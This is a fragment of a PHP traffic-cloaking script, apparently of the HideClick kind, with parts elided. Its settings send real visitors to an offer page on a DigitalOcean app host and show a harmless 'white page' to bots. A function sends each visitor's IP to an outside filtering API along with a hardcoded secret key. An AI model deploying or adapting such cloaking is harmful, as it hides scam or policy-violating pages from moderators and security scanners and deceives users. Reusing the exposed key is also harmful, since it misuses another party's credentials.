...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://king-prawn-app-meity.ondigitalocean.app/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'newc/index.html';//PHP/HTML file or URL used for bots
...
$HCSET['API_SECRET_KEY'] = 'v1026736632dab43d1a57b9e9580a2542c';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-1616539837&js=false&stage='.$HCSET['stage'];
